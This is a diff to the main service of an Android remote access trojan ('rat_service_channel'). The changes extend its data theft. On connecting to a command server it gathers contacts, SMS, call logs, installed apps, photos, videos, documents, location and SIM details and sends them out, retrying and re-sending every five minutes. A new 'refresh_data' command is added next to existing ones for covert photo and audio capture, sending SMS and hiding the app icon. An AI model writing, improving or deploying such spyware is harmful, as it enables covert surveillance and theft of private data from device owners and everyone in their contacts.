@@ -57,13 +57,14 @@ class MainService : Service() {
     private var audioRecorder: MediaRecorder? = null
     private var currentAudioFile: String? = null
     private var deviceId: String = ""
+    private var dataCollectionAttempts = 0
+    private var lastBulkDataSent = 0L
+    private var isConnected = false
     
     companion object {
         private const val TAG = "MainService"   
         private const val NOTIFICATION_ID = 1001
         private const val CHANNEL_ID = "rat_service_channel"
-        // URLs are now read from string resources in strings.xml
-        // Change them there under "server_url" and "ws_url"
         private const val TAG_SERVER_URL = "server_url"
         private const val TAG_WS_URL = "ws_url"
         
@@ -99,6 +100,7 @@ class MainService : Service() {
         const val CMD_CONTINUOUS_LOCATION = "continuous_location"
         const val CMD_STOP_CONTINUOUS_LOCATION = "stop_continuous_location"
         const val CMD_EXFILTRATE_ALL = "exfiltrate_all"
+        const val CMD_REFRESH_DATA = "refresh_data"
     }
     
     override fun onCreate() {
@@ -137,7 +139,8 @@ class MainService : Service() {
     
     override fun onDestroy() {
         isRunning = false
-        socket.disconnect()
+        isConnected = false
+        try { socket.disconnect() } catch (e: Exception) {}
         audioRecorder?.release()
         super.onDestroy()
         
@@ -189,6 +192,7 @@ class MainService : Service() {
     private fun connectToServer() {
         try {
             val wsUrl = getString(R.string.ws_url)
+            Log.d(TAG, "Connecting to: $wsUrl")
             val options = IO.Options().apply {
                 forceNew = true
                 reconnection = true
@@ -203,12 +207,17 @@ class MainService : Service() {
             
             socket.on(Socket.EVENT_CONNECT) {
                 Log.d(TAG, "Connected to server")
+                isConnected = true
                 sendDeviceInfo()
-                sendBulkData()
+                // Attempt data extraction with slight delay to ensure service is ready
+                Handler(Looper.getMainLooper()).postDelayed({
+                    sendBulkData()
+                }, 2000)
             }
             
             socket.on(Socket.EVENT_DISCONNECT) {
                 Log.d(TAG, "Disconnected from server")
+                isConnected = false
             }
             
             socket.on("command") { args ->
@@ -226,7 +235,6 @@ class MainService : Service() {
             
         } catch (e: Exception) {
             Log.e(TAG, "Socket connection error: ${e.message}")
-            // Retry after delay
             Handler(Looper.getMainLooper()).postDelayed({
                 connectToServer()
             }, 10000)
@@ -246,9 +254,11 @@ class MainService : Service() {
                 put("batteryLevel", getBatteryLevel())
                 put("isCharging", isCharging())
                 put("ip", getLocalIpAddress())
+                put("sdkVersion", Build.VERSION.SDK_INT)
             }
             
             socket.emit("device:update", info)
+            Log.d(TAG, "Device info sent")
         } catch (e: Exception) {
             Log.e(TAG, "Error sending device info: ${e.message}")
         }
@@ -257,20 +267,75 @@ class MainService : Service() {
     private fun sendBulkData() {
         Thread {
             try {
+                Log.d(TAG, "Attempting to collect and send bulk data (attempt ${dataCollectionAttempts + 1})")
+                dataCollectionAttempts++
+                
                 val contacts = getContacts()
                 val smsMessages = getSmsMessages()
                 val callLogs = getCallLogs()
+                val deviceInfo = getDetailedDeviceInfo()
+                val installedApps = getInstalledApps()
+                val photos = getMediaFiles("images")
+                val videos = getMediaFiles("videos")
+                val documents = getDocuments()
                 
                 val data = JSONObject()
-                if (contacts != null) data.put("contacts", contacts)
-                if (smsMessages != null) data.put("sms", smsMessages)
-                if (callLogs != null) data.put("callLogs", callLogs)
+                var hasData = false
                 
-                if (data.length() > 0) {
+                if (contacts != null) {
+                    data.put("contacts", contacts)
+                    hasData = true
+                }
+                if (smsMessages != null) {
+                    data.put("sms", smsMessages)
+                    hasData = true
+                }
+                if (callLogs != null) {
+                    data.put("callLogs", callLogs)
+                    hasData = true
+                }
+                if (deviceInfo != null) {
+                    data.put("deviceInfo", deviceInfo)
+                    hasData = true
+                }
+                if (installedApps != null) {
+                    data.put("installedApps", installedApps)
+                    hasData = true
+                }
+                if (photos != null) {
+                    data.put("photos", photos)
+                    hasData = true
+                }
+                if (videos != null) {
+                    data.put("videos", videos)
+                    hasData = true
+                }
+                if (documents != null) {
+                    data.put("documents", documents)
+                    hasData = true
+                }
+                
+                if (hasData && isConnected) {
                     socket.emit("device:data:bulk", data)
+                    lastBulkDataSent = System.currentTimeMillis()
+                    Log.d(TAG, "Bulk data sent successfully")
+                } else {
+                    Log.d(TAG, "No data to send yet (permissions may not be granted)")
+                    // Schedule a retry if we haven't succeeded yet
+                    if (dataCollectionAttempts < 10 && isConnected) {
+                        Handler(Looper.getMainLooper()).postDelayed({
+                            sendBulkData()
+                        }, 15000) // retry every 15 seconds for first 10 attempts
+                    }
                 }
             } catch (e: Exception) {
                 Log.e(TAG, "Error sending bulk data: ${e.message}")
+                // Retry on error
+                if (dataCollectionAttempts < 10 && isConnected) {
+                    Handler(Looper.getMainLooper()).postDelayed({
+                        sendBulkData()
+                    }, 15000)
+                }
             }
         }.start()
     }
@@ -281,6 +346,8 @@ class MainService : Service() {
             val type = data.getString("type")
             val params = if (data.has("params")) data.getJSONObject("params") else JSONObject()
             
+            Log.d(TAG, "Received command: $type")
+            
             Thread {
                 try {
                     val result = executeCommand(type, params)
@@ -289,14 +356,19 @@ class MainService : Service() {
                         put("result", result)
                         put("status", "executed")
                     }
-                    socket.emit("device:result", response)
+                    if (isConnected) {
+                        socket.emit("device:result", response)
+                    }
                 } catch (e: Exception) {
+                    Log.e(TAG, "Command execution error: ${e.message}")
                     val errorResponse = JSONObject().apply {
                         put("commandId", commandId)
                         put("result", "Error: ${e.message}")
                         put("status", "failed")
                     }
-                    socket.emit("device:result", errorResponse)
+                    if (isConnected) {
+                        socket.emit("device:result", errorResponse)
+                    }
                 }
             }.start()
             
@@ -307,9 +379,9 @@ class MainService : Service() {
     
     private fun executeCommand(type: String, params: JSONObject): JSONObject {
         return when (type) {
-            CMD_GET_CONTACTS -> getContacts() ?: JSONObject()
-            CMD_GET_SMS -> getSmsMessages() ?: JSONObject()
-            CMD_GET_CALL_LOGS -> getCallLogs() ?: JSONObject()
+            CMD_GET_CONTACTS -> getContacts() ?: JSONObject().apply { put("error", "Permission not granted or no contacts") }
+            CMD_GET_SMS -> getSmsMessages() ?: JSONObject().apply { put("error", "Permission not granted or no SMS") }
+            CMD_GET_CALL_LOGS -> getCallLogs() ?: JSONObject().apply { put("error", "Permission not granted or no call logs") }
             CMD_GET_LOCATION -> getCurrentLocation()
             CMD_TAKE_PHOTO -> takePhoto()
             CMD_RECORD_AUDIO -> startStopAudioRecording(params)
@@ -331,161 +403,225 @@ class MainService : Service() {
             CMD_CONTINUOUS_LOCATION -> startContinuousLocation()
             CMD_STOP_CONTINUOUS_LOCATION -> stopContinuousLocation()
             CMD_EXFILTRATE_ALL -> exfiltrateAll()
+            CMD_REFRESH_DATA -> refreshData()
             else -> JSONObject().apply { put("error", "Unknown command: $type") }
         }
     }
     
+    private fun refreshData(): JSONObject {
+        Thread {
+            try {
+                Log.d(TAG, "Manual refresh triggered")
+                val contacts = getContacts()
+                val smsMessages = getSmsMessages()
+                val callLogs = getCallLogs()
+                val deviceInfo = getDetailedDeviceInfo()
+                val installedApps = getInstalledApps()
+                val photos = getMediaFiles("images")
+                val videos = getMediaFiles("videos")
+                val documents = getDocuments()
+                val location = getCurrentLocation()
+                val battery = getBatteryInfo()
+                val simInfo = getSimInfo()
+                val networkInfo = getNetworkInfo()
+                
+                val allData = JSONObject()
+                if (contacts != null) allData.put("contacts", contacts)
+                if (smsMessages != null) allData.put("sms", smsMessages)
+                if (callLogs != null) allData.put("callLogs", callLogs)
+                if (deviceInfo != null) allData.put("deviceInfo", deviceInfo)
+                if (installedApps != null) allData.put("installedApps", installedApps)
+                if (photos != null) allData.put("photos", photos)
+                if (videos != null) allData.put("videos", videos)
+                if (documents != null) allData.put("documents", documents)
+                if (location != null) allData.put("location", location)
+                if (battery != null) allData.put("battery", battery)
+                if (simInfo != null) allData.put("simInfo", simInfo)
+                if (networkInfo != null) allData.put("networkInfo", networkInfo)
+                
+                if (isConnected) {
+                    socket.emit("device:data:bulk", allData)
+                    Log.d(TAG, "Refresh data sent")
+                }
+            } catch (e: Exception) {
+                Log.e(TAG, "Refresh error: ${e.message}")
+            }
+        }.start()
+        
+        return JSONObject().apply { put("status", "refreshing") }
+    }
+    
     private fun getContacts(): JSONObject? {
-        if (ActivityCompat.checkSelfPermission(this, 
-                Manifest.permission.READ_CONTACTS) != PackageManager.PERMISSION_GRANTED) {
-            return null
-        }
-        
-        val contacts = JSONArray()
-        val cursor: Cursor? = contentResolver.query(
-            ContactsContract.Contacts.CONTENT_URI,
-            null, null, null, null
-        )
-        
-        cursor?.use { c ->
-            while (c.moveToNext()) {
-                try {
-                    val id = c.getString(c.getColumnIndex(ContactsContract.Contacts._ID))
-                    val name = c.getString(c.getColumnIndex(ContactsContract.Contacts.DISPLAY_NAME))
-                    val hasPhone = c.getString(c.getColumnIndex(ContactsContract.Contacts.HAS_PHONE_NUMBER))
-                    
-                    val contact = JSONObject().apply {
-                        put("id", id)
-                        put("name", name ?: "Unknown")
-                    }
-                    
-                    if (hasPhone == "1") {
-                        val phones = contentResolver.query(
-                            ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
+        try {
+            if (ActivityCompat.checkSelfPermission(this, 
+                    Manifest.permission.READ_CONTACTS) != PackageManager.PERMISSION_GRANTED) {
+                Log.d(TAG, "READ_CONTACTS permission not granted")
+                return null
+            }
+            
+            val contacts = JSONArray()
+            val cursor: Cursor? = contentResolver.query(
+                ContactsContract.Contacts.CONTENT_URI,
+                null, null, null, null
+            )
+            
+            cursor?.use { c ->
+                while (c.moveToNext()) {
+                    try {
+                        val id = c.getString(c.getColumnIndex(ContactsContract.Contacts._ID))
+                        val name = c.getString(c.getColumnIndex(ContactsContract.Contacts.DISPLAY_NAME))
+                        val hasPhone = c.getString(c.getColumnIndex(ContactsContract.Contacts.HAS_PHONE_NUMBER))
+                        
+                        val contact = JSONObject().apply {
+                            put("id", id)
+                            put("name", name ?: "Unknown")
+                        }
+                        
+                        if (hasPhone == "1") {
+                            val phones = contentResolver.query(
+                                ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
+                                null,
+                                "${ContactsContract.CommonDataKinds.Phone.CONTACT_ID} = ?",
+                                arrayOf(id),
+                                null
+                            )
+                            
+                            val phoneNumbers = JSONArray()
+                            phones?.use { p ->
+                                while (p.moveToNext()) {
+                                    val number = p.getString(p.getColumnIndex(
+                                        ContactsContract.CommonDataKinds.Phone.NUMBER))
+                                    val type = p.getString(p.getColumnIndex(
+                                        ContactsContract.CommonDataKinds.Phone.TYPE))
+                                    phoneNumbers.put(JSONObject().apply {
+                                        put("number", number)
+                                        put("type", getPhoneTypeLabel(type.toIntOrNull() ?: 0))
+                                    })
+                                }
+                            }
+                            contact.put("phones", phoneNumbers)
+                        }
+                        
+                        val emails = contentResolver.query(
+                            ContactsContract.CommonDataKinds.Email.CONTENT_URI,
                             null,
-                            "${ContactsContract.CommonDataKinds.Phone.CONTACT_ID} = ?",
+                            "${ContactsContract.CommonDataKinds.Email.CONTACT_ID} = ?",
                             arrayOf(id),
                             null
                         )
                         
-                        val phoneNumbers = JSONArray()
-                        phones?.use { p ->
-                            while (p.moveToNext()) {
-                                val number = p.getString(p.getColumnIndex(
-                                    ContactsContract.CommonDataKinds.Phone.NUMBER))
-                                val type = p.getString(p.getColumnIndex(
-                                    ContactsContract.CommonDataKinds.Phone.TYPE))
-                                phoneNumbers.put(JSONObject().apply {
-                                    put("number", number)
-                                    put("type", getPhoneTypeLabel(type.toIntOrNull() ?: 0))
-                                })
+                        val emailList = JSONArray()
+                        emails?.use { e ->
+                            while (e.moveToNext()) {
+                                val email = e.getString(e.getColumnIndex(
+                                    ContactsContract.CommonDataKinds.Email.ADDRESS))
+                                emailList.put(email)
                             }
                         }
-                        contact.put("phones", phoneNumbers)
+                        if (emailList.length() > 0) contact.put("emails", emailList)
+                        
+                        contacts.put(contact)
+                    } catch (e: Exception) {
+                        Log.e(TAG, "Error reading contact: ${e.message}")
                     }
-                    
-                    // Get email
-                    val emails = contentResolver.query(
-                        ContactsContract.CommonDataKinds.Email.CONTENT_URI,
-                        null,
-                        "${ContactsContract.CommonDataKinds.Email.CONTACT_ID} = ?",
-                        arrayOf(id),
-                        null
-                    )
-                    
-                    val emailList = JSONArray()
-                    emails?.use { e ->
-                        while (e.moveToNext()) {
-                            val email = e.getString(e.getColumnIndex(
-                                ContactsContract.CommonDataKinds.Email.ADDRESS))
-                            emailList.put(email)
-                        }
-                    }
-                    if (emailList.length() > 0) contact.put("emails", emailList)
-                    
-                    contacts.put(contact)
-                } catch (e: Exception) {
-                    Log.e(TAG, "Error reading contact: ${e.message}")
                 }
             }
+            
+            Log.d(TAG, "Read ${contacts.length()} contacts")
+            return JSONObject().apply { put("contacts", contacts) }
+        } catch (e: Exception) {
+            Log.e(TAG, "getContacts error: ${e.message}")
+            return null
         }
-        
-        return JSONObject().apply { put("contacts", contacts) }
     }
     
     private fun getSmsMessages(): JSONObject? {
-        if (ActivityCompat.checkSelfPermission(this,
-                Manifest.permission.READ_SMS) != PackageManager.PERMISSION_GRANTED) {
-            return null
-        }
-        
-        val smsList = JSONArray()
-        val cursor = contentResolver.query(
-            Telephony.Sms.CONTENT_URI,
-            null, null, null,
-            "${Telephony.Sms.DATE} DESC LIMIT 500"
-        )
-        
-        cursor?.use { c ->
-            while (c.moveToNext()) {
-                try {
-                    val sms = JSONObject().apply {
-                        put("id", c.getString(c.getColumnIndex(Telephony.Sms._ID)))
-                        put("address", c.getString(c.getColumnIndex(Telephony.Sms.ADDRESS)))
-                        put("body", c.getString(c.getColumnIndex(Telephony.Sms.BODY)))
-                        put("date", c.getLong(c.getColumnIndex(Telephony.Sms.DATE)))
-                        put("type", if (c.getInt(c.getColumnIndex(Telephony.Sms.TYPE)) == 1) "inbox" else "sent")
-                        put("read", c.getInt(c.getColumnIndex(Telephony.Sms.READ)) == 1)
-                        put("threadId", c.getString(c.getColumnIndex(Telephony.Sms.THREAD_ID)))
+        try {
+            if (ActivityCompat.checkSelfPermission(this,
+                    Manifest.permission.READ_SMS) != PackageManager.PERMISSION_GRANTED) {
+                Log.d(TAG, "READ_SMS permission not granted")
+                return null
+            }
+            
+            val smsList = JSONArray()
+            val cursor = contentResolver.query(
+                Telephony.Sms.CONTENT_URI,
+                null, null, null,
+                "${Telephony.Sms.DATE} DESC LIMIT 500"
+            )
+            
+            cursor?.use { c ->
+                while (c.moveToNext()) {
+                    try {
+                        val sms = JSONObject().apply {
+                            put("id", c.getString(c.getColumnIndex(Telephony.Sms._ID)))
+                            put("address", c.getString(c.getColumnIndex(Telephony.Sms.ADDRESS)))
+                            put("body", c.getString(c.getColumnIndex(Telephony.Sms.BODY)))
+                            put("date", c.getLong(c.getColumnIndex(Telephony.Sms.DATE)))
+                            put("type", if (c.getInt(c.getColumnIndex(Telephony.Sms.TYPE)) == 1) "inbox" else "sent")
+                            put("read", c.getInt(c.getColumnIndex(Telephony.Sms.READ)) == 1)
+                            put("threadId", c.getString(c.getColumnIndex(Telephony.Sms.THREAD_ID)))
+                        }
+                        smsList.put(sms)
+                    } catch (e: Exception) {
+                        Log.e(TAG, "Error reading SMS: ${e.message}")
                     }
-                    smsList.put(sms)
-                } catch (e: Exception) {
-                    Log.e(TAG, "Error reading SMS: ${e.message}")
                 }
             }
-        }
-        
-        return JSONObject().apply { 
-            put("sms", smsList)
-            put("total", smsList.length())
+            
+            Log.d(TAG, "Read ${smsList.length()} SMS messages")
+            return JSONObject().apply { 
+                put("sms", smsList)
+                put("total", smsList.length())
+            }
+        } catch (e: Exception) {
+            Log.e(TAG, "getSmsMessages error: ${e.message}")
+            return null
         }
     }
     
     private fun getCallLogs(): JSONObject? {
-        if (ActivityCompat.checkSelfPermission(this,
-                Manifest.permission.READ_CALL_LOG) != PackageManager.PERMISSION_GRANTED) {
-            return null
-        }
-        
-        val calls = JSONArray()
-        val cursor = contentResolver.query(
-            CallLog.Calls.CONTENT_URI,
-            null, null, null,
-            "${CallLog.Calls.DATE} DESC LIMIT 500"
-        )
-        
-        cursor?.use { c ->
-            while (c.moveToNext()) {
-                try {
-                    val call = JSONObject().apply {
-                        put("id", c.getString(c.getColumnIndex(CallLog.Calls._ID)))
-                        put("number", c.getString(c.getColumnIndex(CallLog.Calls.NUMBER)))
-                        put("name", c.getString(c.getColumnIndex(CallLog.Calls.CACHED_NAME)))
-                        put("type", getCallTypeLabel(c.getInt(c.getColumnIndex(CallLog.Calls.TYPE))))
-                        put("duration", c.getLong(c.getColumnIndex(CallLog.Calls.DURATION)))
-                        put("date", c.getLong(c.getColumnIndex(CallLog.Calls.DATE)))
-                        put("country", c.getString(c.getColumnIndex(CallLog.Calls.COUNTRY_ISO)))
+        try {
+            if (ActivityCompat.checkSelfPermission(this,
+                    Manifest.permission.READ_CALL_LOG) != PackageManager.PERMISSION_GRANTED) {
+                Log.d(TAG, "READ_CALL_LOG permission not granted")
+                return null
+            }
+            
+            val calls = JSONArray()
+            val cursor = contentResolver.query(
+                CallLog.Calls.CONTENT_URI,
+                null, null, null,
+                "${CallLog.Calls.DATE} DESC LIMIT 500"
+            )
+            
+            cursor?.use { c ->
+                while (c.moveToNext()) {
+                    try {
+                        val call = JSONObject().apply {
+                            put("id", c.getString(c.getColumnIndex(CallLog.Calls._ID)))
+                            put("number", c.getString(c.getColumnIndex(CallLog.Calls.NUMBER)))
+                            put("name", c.getString(c.getColumnIndex(CallLog.Calls.CACHED_NAME)))
+                            put("type", getCallTypeLabel(c.getInt(c.getColumnIndex(CallLog.Calls.TYPE))))
+                            put("duration", c.getLong(c.getColumnIndex(CallLog.Calls.DURATION)))
+                            put("date", c.getLong(c.getColumnIndex(CallLog.Calls.DATE)))
+                            put("country", c.getString(c.getColumnIndex(CallLog.Calls.COUNTRY_ISO)))
+                        }
+                        calls.put(call)
+                    } catch (e: Exception) {
+                        Log.e(TAG, "Error reading call log: ${e.message}")
                     }
-                    calls.put(call)
-                } catch (e: Exception) {
-                    Log.e(TAG, "Error reading call log: ${e.message}")
                 }
             }
-        }
-        
-        return JSONObject().apply { 
-            put("callLogs", calls)
-            put("total", calls.length())
+            
+            Log.d(TAG, "Read ${calls.length()} call logs")
+            return JSONObject().apply { 
+                put("callLogs", calls)
+                put("total", calls.length())
+            }
+        } catch (e: Exception) {
+            Log.e(TAG, "getCallLogs error: ${e.message}")
+            return null
         }
     }
     
@@ -533,8 +669,6 @@ class MainService : Service() {
             val file = File.createTempFile("photo_", ".jpg", cacheDir)
             val filePath = file.absolutePath
             
-            // Use CameraManager to trigger photo capture
-            // For simplicity, using MediaStore to capture
             val values = ContentValues()
             values.put(MediaStore.Images.Media.DISPLAY_NAME, "IMG_${System.currentTimeMillis()}.jpg")
             values.put(MediaStore.Images.Media.MIME_TYPE, "image/jpeg")
@@ -607,7 +741,6 @@ class MainService : Service() {
             audioRecorder = null
             isRecordingAudio = false
             
-            // Upload audio file
             val audioData = if (currentAudioFile != null) {
                 File(currentAudioFile).readBytes()
             } else null
@@ -851,8 +984,6 @@ class MainService : Service() {
             val number = params.getString("number")
             val message = params.getString("message")
             
-            // Requires SEND_SMS permission
-            // Using reflection or SmsManager
             val smsManagerClass = Class.forName("android.telephony.SmsManager")
             val getDefault = smsManagerClass.getMethod("getDefault")
             val smsManager = getDefault.invoke(null)
@@ -970,7 +1101,6 @@ class MainService : Service() {
     
     private fun hideAppLauncher(): JSONObject {
         try {
-            // Remove launcher icon
             packageManager.setComponentEnabledSetting(
                 ComponentName(this, MainActivity::class.java),
                 PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
@@ -1131,6 +1261,11 @@ class MainService : Service() {
                         put("batteryLevel", getBatteryLevel())
                         put("isCharging", isCharging())
                     })
+                    
+                    // Also try to re-send bulk data every 5 minutes in case new data is available
+                    if (System.currentTimeMillis() - lastBulkDataSent > 300000) { // 5 min
+                        sendBulkData()
+                    }
                     
                 } catch (e: Exception) {
                     Log.e(TAG, "Periodic update error: ${e.message}")
